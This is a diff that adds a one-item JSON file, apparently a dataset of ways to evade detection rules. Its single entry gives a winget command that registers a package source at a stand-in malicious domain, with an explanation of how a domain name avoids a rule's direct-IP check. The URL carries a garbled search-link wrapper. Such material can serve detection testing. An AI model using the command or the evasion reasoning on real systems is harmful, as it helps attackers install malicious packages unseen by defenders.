@@ -1,0 +1,6 @@
+[
+  {
+    "output": "winget source add -n evadesource -a [https://malicious-domain.com/winget](https://www.google.com/search?q=https://malicious-domain.com/winget)",
+    "explanation": "Bypasses the selection_source_direct_ip condition entirely. Because the rule's logic relies on direct IP connections as a heuristic for suspicious activity, mapping the malicious server to a registered domain name completely dodges the IP regex check."
+  }
+]
